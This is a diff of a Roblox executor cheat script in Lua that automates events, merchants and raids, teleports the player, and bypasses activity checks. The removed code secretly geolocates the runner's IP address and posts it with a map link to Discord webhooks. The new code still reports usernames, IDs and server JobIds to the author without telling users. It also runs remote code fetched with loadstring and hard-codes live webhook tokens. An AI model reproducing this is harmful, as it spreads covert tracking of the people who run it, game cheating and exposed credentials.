@@ -1,6 +1,9 @@
+--main
 --------------------------------------------------
--- 🔒 WHITELIST + 📊 EXECUTION TRACKER (COMBINED)
+-- 🔒 USERID WHITELIST + PLACEID CHECK + SERVER INFO + EXECUTION LOG
 --------------------------------------------------
+
+-- Services
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
@@ -8,157 +11,933 @@ local LocalPlayer = Players.LocalPlayer
 -- Executor HTTP
 local http = http_request or request or syn.request
 if not http then
-    warn("Executor does not support HTTP")
+    warn("❌ Your executor does not support HTTP requests.")
     return
 end
 
--- Function to get the user's public IP address
-local function getIpAddress()
-    local success, result = pcall(function()
-        return http({Url = "https://api.ipify.org?format=json"}).Body
-    end)
-    if success then
-        local jsonResult = HttpService:JSONDecode(result)
-        return jsonResult.ip
-    else
-        return "Unknown"
-    end
-end
-
--- Function to get a Google Maps link for an IP address
-local function getIpMapLink(ipAddress)
-    local apiUrl = "http://ip-api.com/json/" .. ipAddress
-    local success, response = pcall(function()
-        return http({Url = apiUrl}).Body
-    end)
-    if not success then
-        warn("Failed to get IP location data.")
-        return "https://www.google.com/maps"
-    end
-    local data = HttpService:JSONDecode(response)
-    if data.status == "success" and data.lat and data.lon then
-        local lat = data.lat
-        local lon = data.lon
-        return "https://www.google.com/maps?q=" .. lat .. "," .. lon
-    else
-        warn("Could not find location for IP: " .. ipAddress)
-        return "https://www.google.com/maps"
-    end
-end
-
--- Get IP and Map Link at the start
-local userIp = getIpAddress()
-local mapLink = getIpMapLink(userIp)
-
 --------------------------------------------------
--- 🔑 WEBHOOKS
---------------------------------------------------
-local ALLOWED_WEBHOOK = "https://discord.com/api/webhooks/1451755511543369901/VruTxLIkeAsnxWeYB4TFPsv6k7vGhsI_C7f5IiJaPeZKnUFZzbhMmOkJ7xDRXWgQ8mP-"
-local DENIED_WEBHOOK = "https://discord.com/api/webhooks/1451755511543369901/VruTxLIkeAsnxWeYB4TFPsv6k7vGhsI_C7f5IiJaPeZKnUFZzbhMmOkJ7xDRXWgQ8mP-"
-local LEFT_GAME_WEBHOOK = "https://discord.com/api/webhooks/1451755511543369901/VruTxLIkeAsnxWeYB4TFPsv6k7vGhsI_C7f5IiJaPeZKnUFZzbhMmOkJ7xDRXWgQ8mP-"
-
---------------------------------------------------
--- ✅ USERID WHITELIST
+-- ✅ WHITELIST
 --------------------------------------------------
 local Whitelist = {
     [1701156929] = true, -- goku_agma
-    [8695533338] = true, -- iamnotldsteam  <-- excluded from whitelist/logging
-    [3567838979] = true, -- Diego_Awan10
+    [8695533338] = true, -- iamnotldsteam
+    [2439933624] = true, -- Diego_Awan10
     [5799411179] = true, -- H_Hclan
+    [4322338371] = true, -- Sauzeriz
 }
 
-local excludedUserId = 86955337338 -- iamnotldsteam
+--------------------------------------------------
+-- 🔗 WEBHOOKS
+--------------------------------------------------
+local ACCESS_WEBHOOK  = "https://discord.com/api/webhooks/1450924181305954521/_JsgYrdC6EKBVXM69iTQTVC52PYaN0JNTQuyDml3LGyv0mshvYIswmrJ_FSOc8xwXIMa"
+local SERVER_WEBHOOK  = "https://discord.com/api/webhooks/1451343914253684909/ocLwilQbov3JXmU3HGZVQAZKSIbDswKjU7ijWjIFe7Q2vN7tIOxGaFMlITiv2Ta58Lne"
+
+-- Function to send message to webhook
+local function sendWebhook(url, msg)
+    pcall(function()
+        http({
+            Url = url,
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ content = msg })
+        })
+    end)
+end
 
 --------------------------------------------------
--- ❌ NOT WHITELISTED → SEND + STOP
+-- ✅ WHITELIST CHECK
 --------------------------------------------------
-if LocalPlayer.UserId ~= excludedUserId and not Whitelist[LocalPlayer.UserId] then
-    local payload = {
-        content = "**❌ Script Blocked**\n" ..
-                  "👤 User: " .. LocalPlayer.Name .. "\n" ..
-                  "🆔 UserId: " .. LocalPlayer.UserId .. "\n" ..
-                  "🌐 IP: " .. userIp .. "\n" ..
-                  "🗺️ Map: " .. mapLink .. "\n" ..
-                  "🎮 PlaceId: " .. game.PlaceId
-    }
-    http({
-        Url = DENIED_WEBHOOK,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(payload)
-    })
+if not Whitelist[LocalPlayer.UserId] then
     warn("❌ You are not whitelisted to use this script.")
+    sendWebhook(ACCESS_WEBHOOK, 
+        "❌ **Script Denied**\n" ..
+        "👤 User: " .. LocalPlayer.Name .. "\n" ..
+        "🆔 UserId: " .. LocalPlayer.UserId
+    )
     return
 end
 
 --------------------------------------------------
--- 📁 USAGE TRACKING (LOCAL FILE)
+-- ✅ PLACEID CHECK
 --------------------------------------------------
-if LocalPlayer.UserId ~= excludedUserId then
-    local FILE_NAME = "script_usage.json"
-    local UsageData = {}
+local ALLOWED_PLACEID = 80184918744223
 
-    if isfile(FILE_NAME) then
-        local success, data = pcall(function()
-            return HttpService:JSONDecode(readfile(FILE_NAME))
-        end)
-        if success and typeof(data) == "table" then
-            UsageData = data
-        end
-    end
-
-    local uid = tostring(LocalPlayer.UserId)
-    UsageData[uid] = (UsageData[uid] or 0) + 1
-    writefile(FILE_NAME, HttpService:JSONEncode(UsageData))
-
-    --------------------------------------------------
-    -- 📤 SEND ALLOWED LOG
-    --------------------------------------------------
-    local payload = {
-        content = "**✅ Script Executed**\n" ..
-                  "👤 User: " .. LocalPlayer.Name .. "\n" ..
-                  "🆔 UserId: " .. LocalPlayer.UserId .. "\n" ..
-                  "🌐 IP: " .. userIp .. "\n" ..
-                  "🗺️ Map: " .. mapLink .. "\n" ..
-                  "🎮 PlaceId: " .. game.PlaceId .. "\n" ..
-                  "📊 Total Uses: " .. UsageData[uid]
-    }
-    http({
-        Url = ALLOWED_WEBHOOK,
-        Method = "POST",
-        Headers = {["Content-Type"] = "application/json"},
-        Body = HttpService:JSONEncode(payload)
-    })
+if game.PlaceId ~= ALLOWED_PLACEID then
+    warn("❌ You cannot run this script in this game.")
+    sendWebhook(ACCESS_WEBHOOK,
+        "❌ **Wrong Game Attempt**\n" ..
+        "👤 User: " .. LocalPlayer.Name .. "\n" ..
+        "🆔 UserId: " .. LocalPlayer.UserId .. "\n" ..
+        "🎮 PlaceId: " .. game.PlaceId .. " (Not Allowed)"
+    )
+    return
 end
 
+warn("✅ You are allowed to use this script in this game.")
+
 --------------------------------------------------
--- 🚪 TRACK PLAYER LEAVING
+-- 🖥 SERVER INFO (ON EXECUTE)
 --------------------------------------------------
-Players.PlayerRemoving:Connect(function(player)
-    if player.UserId ~= excludedUserId and player == LocalPlayer then
-        local payload_leave = {
-            content = "**⚠️ Player Left**\n" ..
-                      "👤 User: " .. player.Name .. "\n" ..
-                      "🆔 UserId: " .. player.UserId .. "\n" ..
-                      "🌐 IP: " .. userIp .. "\n" ..
-                      "🗺️ Map: " .. mapLink .. "\n" ..
-                      "🎮 PlaceId: " .. game.PlaceId
-        }
-        http({
-            Url = LEFT_GAME_WEBHOOK,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(payload_leave)
-        })
+sendWebhook(SERVER_WEBHOOK,
+    "🖥 **Server Info**\n" ..
+    "🎮 PlaceId: `" .. game.PlaceId .. "`\n" ..
+    "🧩 JobId: `" .. game.JobId .. "`\n" ..
+    "👥 Players: `" .. #Players:GetPlayers() .. "`"
+)
+
+--------------------------------------------------
+-- ▶️ EXECUTION TRACKING (LOCAL FILE)
+--------------------------------------------------
+local FILE = "script_usage.json"
+local data = {}
+
+if isfile(FILE) then
+    pcall(function()
+        data = HttpService:JSONDecode(readfile(FILE))
+    end)
+end
+
+local uid = tostring(LocalPlayer.UserId)
+data[uid] = (data[uid] or 0) + 1
+writefile(FILE, HttpService:JSONEncode(data))
+
+-- ✅ Send executed message to webhook
+sendWebhook(ACCESS_WEBHOOK,
+    "✅ **Script Executed**\n" ..
+    "👤 User: " .. LocalPlayer.Name .. "\n" ..
+    "🆔 UserId: " .. LocalPlayer.UserId .. "\n" ..
+    "📊 Total Runs: " .. data[uid] .. "\n" ..
+    "🎮 PlaceId: " .. game.PlaceId
+)
+
+warn("✅ Script executed successfully!")
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- LOAD FLUENT
+local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
+local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
+local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
+
+--------------------------------------------------
+-- WINDOW / TABS
+--------------------------------------------------
+local Window = Fluent:CreateWindow({
+    Title = "Button Eternal " .. Fluent.Version,
+    SubTitle = "by iamnotldsteam",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(580, 460),
+    Acrylic = true,
+    Theme = "Dark",
+    MinimizeKey = Enum.KeyCode.LeftControl
+})
+
+local Tabs = {
+    Issue = Window:AddTab({ Title = "ℹ️ Issue", Icon = "" }),
+    Event = Window:AddTab({ Title = "🎉 Event", Icon = "" }),
+    Button = Window:AddTab({ Title = "🔘 Buttons", Icon = "" }),
+    Merchant = Window:AddTab({ Title = "🛒 Merchant", Icon = "" }),
+    Raid = Window:AddTab({ Title = "💀 Raid", Icon = "" }),
+    Other = Window:AddTab({ Title = "Other", Icon = "" }),
+    Settings = Window:AddTab({ Title = "⚙️ Settings", Icon = "" })
+}
+
+--------------------------------------------------
+-- SERVICES
+--------------------------------------------------
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+--------------------------------------------------
+-- STATE
+--------------------------------------------------
+local collectConnection = nil
+
+--------------------------------------------------
+-- 🎄 COLLECT CANES
+--------------------------------------------------
+Tabs.Event:AddToggle("CollectCanes", {
+    Title = "🎄 Collect Canes",
+    Default = false,
+}):OnChanged(function(state)
+
+    -- 🔴 TURN OFF
+    if not state then
+        if collectConnection then
+            collectConnection:Disconnect()
+            collectConnection = nil
+        end
+        return
     end
+
+    -- 🟢 TURN ON
+    task.spawn(function()
+        local dropsFolder
+        local success = pcall(function()
+            dropsFolder = workspace:WaitForChild("Maps", 10)
+                :WaitForChild("ChristmasEvent", 10)
+                :WaitForChild("Collecting", 10)
+                :WaitForChild("Drops", 10)
+        end)
+
+        if not success or not dropsFolder then return end
+
+        -- Safety: disconnect before reconnect
+        if collectConnection then
+            collectConnection:Disconnect()
+        end
+
+        collectConnection = RunService.Heartbeat:Connect(function()
+            for _, drop in ipairs(dropsFolder:GetChildren()) do
+                pcall(function()
+                    ReplicatedStorage.Assets.RemoteEvent:FireServer(
+                        "CollectChristmas",
+                        drop.Name
+                    )
+                end)
+            end
+        end)
+    end)
+end)
+
+
+--------------------------------------------------
+-- 🎁 PRESENT DELIVERY
+--------------------------------------------------
+Tabs.Event:AddToggle("PresentDeliver", {
+    Title = "🎁 Present Delivery",
+    Default = false,
+}):OnChanged(function(state)
+    local presentEnabled = state
+    local presentTask
+    local hasClaimed = false
+
+    task.spawn(function()
+        local remoteFunction = ReplicatedStorage:WaitForChild("Assets",10):WaitForChild("RemoteFunction",10)
+        if not remoteFunction then return end
+
+        local info
+        local success, _ = pcall(function()
+            info = workspace:WaitForChild("Maps",10)
+                :WaitForChild("ChristmasEvent",10)
+                :WaitForChild("Deliver",10)
+                :WaitForChild("PresentGiver",10)
+                :WaitForChild("Holder",10)
+                :WaitForChild("Info",10)
+        end)
+        if not success or not info then return end
+
+        local function isReady(text)
+            local t = text:upper()
+            return t == "READY" or t == "YOUR NEXT PRESENT FOR DELIVERY IS READY!"
+        end
+
+        local function claimPresent()
+            pcall(function()
+                remoteFunction:InvokeServer("NextPresentDeliver")
+            end)
+        end
+
+        local function deliverSequence()
+            for i = 1, 5 do
+                if not presentEnabled then return end
+                pcall(function()
+                    remoteFunction:InvokeServer("DeliverToHouse", i)
+                end)
+                task.wait(5)
+            end
+        end
+
+        if presentTask then
+            task.cancel(presentTask)
+            presentTask = nil
+        end
+
+        if presentEnabled then
+            presentTask = task.spawn(function()
+                while presentEnabled do
+                    local text = info.Text
+                    if not hasClaimed and isReady(text) then
+                        hasClaimed = true
+                        claimPresent()
+                        task.wait(0.5)
+                        deliverSequence()
+                    end
+                    if hasClaimed and text:match("%d+:%d+") then
+                        hasClaimed = false
+                    end
+                    task.wait(0.5)
+                end
+            end)
+        end
+    end)
 end)
 
 --------------------------------------------------
--- SCRIPT CONTINUES
+-- 🛒 MERCHANT AUTO BUY
 --------------------------------------------------
-print("✅ Script loaded")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Merchant data
+local merchants = {
+    {name = "GemMerchant", baseString = "BuyMerchant"},
+    {name = "FruitMerchant", baseString = "BuyMerchant"},
+    {name = "RaidMerchant", baseString = "BuyMerchant"}, -- added RaidMerchant
+}
+
+-- Table to track active loops for each merchant
+local activeLoops = {}
+
+-- Function to start the loop for a specific merchant
+local function startMerchantLoop(merchant)
+    if activeLoops[merchant.name] then return end -- already running
+
+    activeLoops[merchant.name] = true
+    spawn(function()
+        while activeLoops[merchant.name] do
+            -- Number 1
+            local args1 = {merchant.baseString, merchant.name, 1}
+            ReplicatedStorage:WaitForChild("Assets"):WaitForChild("RemoteFunction"):InvokeServer(unpack(args1))
+            wait(3)
+
+            -- Number 2
+            local args2 = {merchant.baseString, merchant.name, 2}
+            ReplicatedStorage:WaitForChild("Assets"):WaitForChild("RemoteFunction"):InvokeServer(unpack(args2))
+            wait(3)
+        end
+    end)
+end
+
+-- Function to stop the loop for a specific merchant
+local function stopMerchantLoop(merchant)
+    activeLoops[merchant.name] = false
+end
+
+-- UI toggles for each merchant
+for _, merchant in ipairs(merchants) do
+    local toggle = Tabs.Merchant:AddToggle(merchant.name .. "Toggle", {
+        Title = merchant.name,
+        Default = false
+    })
+
+    toggle:OnChanged(function(value)
+        if value then
+            startMerchantLoop(merchant)
+        else
+            stopMerchantLoop(merchant)
+        end
+    end)
+end
+--------------------------------------------------
+-- 🎰 MULTI DROPDOWN EXAMPLE
+--------------------------------------------------
+
+--------------------------------------------------
+-- 💀 RAID DAMAGE
+--------------------------------------------------
+local raidTask
+local raidEnabled = false
+local autoState = false -- tracks current toggle state
+
+local raidToggle = Tabs.Raid:AddToggle("RaidDamage", {
+    Title = "💀 Raid Damage",
+    Default = false,
+})
+
+raidToggle:OnChanged(function(state)
+    raidEnabled = state
+    autoState = state
+
+    -- Stop old loop
+    if raidTask then
+        task.cancel(raidTask)
+        raidTask = nil
+    end
+
+    if not raidEnabled then
+        return
+    end
+
+    raidTask = task.spawn(function()
+        local RemoteFunction
+        local success = pcall(function()
+            RemoteFunction = ReplicatedStorage
+                :WaitForChild("Assets", 10)
+                :WaitForChild("RemoteFunction", 10)
+        end)
+
+        if not success or not RemoteFunction then
+            warn("❌ Raid Damage: RemoteFunction not found!")
+            return
+        end
+
+        while raidEnabled do
+            pcall(function()
+                RemoteFunction:InvokeServer("DamageRaid")
+            end)
+            task.wait()
+        end
+    end)
+end)
+--------------------------------------------------
+-- 🚪 AUTO ENTER MAGIC RAID (SAFE VERSION)
+--------------------------------------------------
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RemoteFunction = ReplicatedStorage.Assets.RemoteFunction
+
+local RAID_MAP_NAME = "MagicRaid"
+
+local enterRaidEnabled = false
+local loopRunning = false
+
+local enterRaidToggle = Tabs.Raid:AddToggle("EnterRaid", {
+    Title = "🚪 Auto Enter Magic Raid",
+    Default = false,
+})
+
+enterRaidToggle:OnChanged(function(state)
+    enterRaidEnabled = state
+
+    -- Stop loop safely
+    if not enterRaidEnabled then
+        loopRunning = false
+        return
+    end
+
+    -- Prevent duplicate loops
+    if loopRunning then return end
+    loopRunning = true
+
+    task.spawn(function()
+        while loopRunning and enterRaidEnabled do
+            task.wait(1)
+
+            local maps = workspace:FindFirstChild("Maps")
+            local inRaid = maps and maps:FindFirstChild(RAID_MAP_NAME)
+
+            -- If inside raid → pause attempts
+            if inRaid then
+                task.wait(1)
+                continue
+            end
+
+            -- Try enter raid
+            local success = pcall(function()
+                RemoteFunction:InvokeServer("StartRaid", "MagicRaid")
+            end)
+
+            task.wait(1)
+
+            -- Check again
+            maps = workspace:FindFirstChild("Maps")
+            if not (maps and maps:FindFirstChild(RAID_MAP_NAME)) then
+                -- No key → turn off toggle
+                enterRaidToggle:SetValue(false)
+                enterRaidEnabled = false
+                loopRunning = false
+                return
+            end
+        end
+
+        loopRunning = false
+    end)
+end)
+
+
+
+--------------------------------------------------
+-- 🔍 AUTO TOGGLE (workspace.Maps → MagicRaid)
+--------------------------------------------------
+local RAID_MAP_NAME = "MagicRaid"
+
+task.spawn(function()
+    while true do
+        task.wait(1)
+
+        local maps = workspace:FindFirstChild("Maps")
+        if not maps then continue end
+
+        local isMagicRaid = false
+        for _, map in ipairs(maps:GetChildren()) do
+            if map.Name == RAID_MAP_NAME then
+                isMagicRaid = true
+                break
+            end
+        end
+
+        -- Turn ON
+        if isMagicRaid and not autoState then
+            autoState = true
+            raidToggle:SetValue(true)
+        end
+
+        -- Turn OFF
+        if not isMagicRaid and autoState then
+            autoState = false
+            raidToggle:SetValue(false)
+        end
+    end
+end)
 
 
 
 
 
+--------------------------------------------------
+-- OTHER
+
+
+
+    Tabs.Other:AddButton({
+        Title = "Afk",
+        Description = "Very important button",
+        Callback = function()
+            local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local RemoteEvent = ReplicatedStorage:WaitForChild("Assets"):WaitForChild("RemoteEvent")
+
+task.spawn(function()
+    while task.wait(25) do
+        pcall(function()
+            RemoteEvent:FireServer("ActivityCheck")
+        end)
+    end
+end)
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Genesisuii/Genesisuii/refs/heads/main/Anti%20AFK%20script", true))()
+        end
+    })
+
+
+
+
+
+
+
+
+
+
+
+
+
+----------------- Buttons-----------------
+
+
+-- Services
+local Players = game:GetService("Players")
+
+local player = Players.LocalPlayer
+local char = player.Character or player.CharacterAdded:Wait()
+local hrp = char:WaitForChild("HumanoidRootPart")
+local workspaceButtons = workspace:WaitForChild("Buttons")
+
+-- =========================
+-- FOLDER DATA (Button -> Enabled)
+-- =========================
+local folderData = {
+    -- Magic
+    {Name = "Essence", Enabled = true},
+    {Name = "Spirit", Enabled = true},
+    {Name = "Mana", Enabled = true},
+    {Name = "Petal", Enabled = true},
+    {Name = "Moss", Enabled = true},
+
+    -- Farm
+    {Name = "Blooming", Enabled = true},
+    {Name = "Crop", Enabled = true},
+    {Name = "Plant", Enabled = true},
+    {Name = "Sprout", Enabled = true},
+    {Name = "Soil", Enabled = true},
+
+    -- Snow
+    {Name = "Frostwarden", Enabled = true},  -- uses last button logic
+    {Name = "Arctic", Enabled = true},
+    {Name = "Cryo", Enabled = true},
+    {Name = "Glacier", Enabled = true},
+    {Name = "Crystal", Enabled = true},
+    {Name = "Icy", Enabled = true},
+    {Name = "Snow", Enabled = true},
+
+    -- Void
+    {Name = "Voidflame", Enabled = false},
+    {Name = "Eclipsed", Enabled = false},
+    {Name = "Hollow", Enabled = false},
+    {Name = "Infernal", Enabled = false},
+    {Name = "Corrupt", Enabled = false},
+
+    -- Desert
+    {Name = "Oblivion", Enabled = false},
+    {Name = "Singularity", Enabled = false},
+    {Name = "Immortal", Enabled = false},
+    {Name = "Radiant", Enabled = false},
+    {Name = "Celestial", Enabled = false},
+
+    -- Spawn
+    {Name = "Eternal", Enabled = false},
+    {Name = "Unreal", Enabled = false},
+    {Name = "Divine", Enabled = false},
+    {Name = "Insane", Enabled = false},
+    {Name = "Ultra", Enabled = false},
+    {Name = "Prestige", Enabled = false},
+    {Name = "Rebirth", Enabled = false},
+    {Name = "Multiplier", Enabled = false}
+}
+
+-- =========================
+-- BUTTON NAME PRIORITY (higher index = better)
+-- =========================
+local namePriority = {
+    "Frostwarden", "Arctic", "Cryo", "Glacier", "Crystal", "Icy", "Snow",
+    "Essence", "Spirit", "Mana", "Petal", "Moss",
+    "Blooming", "Crop", "Plant", "Sprout", "Soil"
+}
+
+local namePriorityMap = {}
+for i, name in ipairs(namePriority) do
+    namePriorityMap[name] = i
+end
+
+local running = false
+local killed = false
+
+--------------------------------------------------------------------
+-- GET LAST BUTTON FOR FROSTWARDEN
+--------------------------------------------------------------------
+local function getLastButton(folder)
+    local highestNum = -math.huge
+    local bestButton = nil
+    for _, button in ipairs(folder:GetChildren()) do
+        local buyPart = button:FindFirstChild("Buy")
+        if buyPart and buyPart:IsA("BasePart") then
+            if buyPart.Material ~= Enum.Material.Plastic then
+                local num = tonumber(button.Name)
+                if num and num > highestNum then
+                    highestNum = num
+                    bestButton = buyPart
+                end
+            end
+        end
+    end
+    return bestButton
+end
+
+--------------------------------------------------------------------
+-- GET BEST BUTTON BY NAME PRIORITY THEN NUMBER
+--------------------------------------------------------------------
+local function getBestButton(folder)
+    local bestButton = nil
+    local bestPriority = -math.huge
+    local bestNum = -math.huge
+    for _, b in ipairs(folder:GetChildren()) do
+        local buy = b:FindFirstChild("Buy")
+        if buy and buy:IsA("BasePart") and buy.Material ~= Enum.Material.Plastic then
+            local num = tonumber(b.Name) or 0
+            local priority = namePriorityMap[b.Parent.Name] or 0
+            if priority > bestPriority or (priority == bestPriority and num > bestNum) then
+                bestPriority = priority
+                bestNum = num
+                bestButton = buy
+            end
+        end
+    end
+    return bestButton
+end
+
+--------------------------------------------------------------------
+-- CHOOSE FUNCTION BASED ON FOLDER NAME
+--------------------------------------------------------------------
+local function getButton(folderName, folder)
+    if folderName == "Frostwarden" then
+        return getLastButton(folder)
+    else
+        return getBestButton(folder)
+    end
+end
+
+--------------------------------------------------------------------
+-- MAIN LOOP
+--------------------------------------------------------------------
+local function checkButtons()
+    while running and not killed do
+        for _, folderInfo in ipairs(folderData) do
+            if folderInfo.Enabled then
+                local folder = workspaceButtons:FindFirstChild(folderInfo.Name)
+                if folder then
+                    local btn = getButton(folderInfo.Name, folder)
+                    if btn then
+                        hrp.CFrame = btn.CFrame + Vector3.new(0, 3, 0)
+                        break
+                    end
+                end
+            end
+        end
+        task.wait(0.5)
+    end
+end
+
+--------------------------------------------------------------------
+-- TOGGLE IN TAB
+--------------------------------------------------------------------
+local Toggle = Tabs.Button:AddToggle("MyToggle", {Title = "Button Teleport", Default = false})
+
+Toggle:OnChanged(function()
+    running = Toggle.Value
+    if running then
+        task.spawn(checkButtons)
+    end
+end)
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--------------------------------------------------
+-- SAVE / INTERFACE MANAGERS
+--------------------------------------------------
+SaveManager:SetLibrary(Fluent)
+InterfaceManager:SetLibrary(Fluent)
+
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes({})
+InterfaceManager:SetFolder("FluentScriptHub")
+SaveManager:SetFolder("FluentScriptHub/specific-game")
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+
+Window:SelectTab(1)
+
+Fluent:Notify({
+    Title = "Fluent",
+    Content = "The script has been loaded successfully! ✅",
+    Duration = 8
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--------------------------------------------------
+-- ℹ️ INFO / UPDATE WINDOW
+--------------------------------------------------
+local InfoTab = Window:AddTab({
+    Title = "ℹ️ Info",
+    Icon = ""
+})
+
+-- Script Overview
+InfoTab:AddParagraph({
+    Title = "📌 Script Overview",
+    Content = [[
+This script is an all-in-one automation and utility hub.
+It is protected by a UserID whitelist and built using the Fluent UI library.
+
+The script focuses on events, raids, merchants, teleport runes,
+and quality-of-life automation.
+]]
+})
+
+-- Event Features
+InfoTab:AddParagraph({
+    Title = "🎉 Event Features",
+    Content = [[
+• Auto Collect Christmas Canes
+• Auto Deliver Presents
+• Automatically detects event readiness
+• Safe loops with task control
+]]
+})
+
+-- Merchant Features
+InfoTab:AddParagraph({
+    Title = "🛒 Merchant Automation",
+    Content = [[
+• Select merchants using a multi-dropdown
+• Auto-buy items from selected merchants
+• Safe toggle-based loop system
+• No keybinds required
+]]
+})
+
+-- Rune Teleport System
+InfoTab:AddParagraph({
+    Title = "🔮 Rune Teleport System",
+    Content = [[
+• Teleport to all major maps
+• Supports multiple runes per map
+• Includes Magic Forest & Magic Raid runes
+• Automatically waits for map load before teleporting
+]]
+})
+
+-- Raid System
+InfoTab:AddParagraph({
+    Title = "💀 Raid System",
+    Content = [[
+• Auto Enter Magic Raid (safe loop)
+• Auto Raid Damage when inside raid
+• Detects map changes in real time
+• Automatically disables when raid ends
+]]
+})
+
+-- Other Utilities
+InfoTab:AddParagraph({
+    Title = "⚙️ Other Utilities",
+    Content = [[
+• Anti-AFK system
+• Activity check bypass
+• SaveManager & InterfaceManager support
+• Theme & config saving
+]]
+})
+
+-- Update Info
+InfoTab:AddParagraph({
+    Title = "🆕 Latest Updates",
+    Content = [[
+✔ Added Magic Raid auto-detection
+✔ Added second Magic Forest rune
+✔ Improved loop safety
+✔ Cleaner task handling
+✔ Better UI organization
+]]
+})
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1450697481078833205/YP95MPAzLqVf3mFsq18XFPLCxpUFZpyQaA3qDa7AwoSnVlN8vtXwdmf3Z_kDmcPOMgJU"
+
+-- HTTP request wrapper (works on most executors)
+local http = http_request or request or syn.request
+
+-- Fluent Input
+local Input = Tabs.Issue:AddInput("DiscordInput", {
+    Title = "Report Issue to Owner",
+    Default = "",
+    Placeholder = "Type message here",
+    Numeric = false,
+    Finished = true, -- ONLY send when Enter is pressed
+    Callback = function(Value)
+        if not Value or Value == "" then return end
+
+        local data = {
+            content = "**Issue**\n" ..
+                      "User: " .. tostring(game.Players.LocalPlayer.Name) .. "\n" ..
+                      "Message: " .. Value
+        }
+
+        http({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = game:GetService("HttpService"):JSONEncode(data)
+        })
+    end
+})
+
+
+
+
+
+
+
+
+
+-- ⚠️ Merchant Error (Static)
+--------------------------------------------------
+-- Add the paragraph once
+--local IssueParagraph = Tabs.Issue:AddParagraph({
+--   Title = "🛑 Merchant System Error",
+--    Content = 
+--        "Merchant Auto Buy is currently NOT working.\n\n" ..
+--        "🗓 Date: December 17, 2025\n" ..
+--        "⏰ Estimated Fix Time: Between 1:00 PM and 5:0 PM December 17, 2025\n" ..
+--        "✨ More fixes and updates coming soon."
+--})
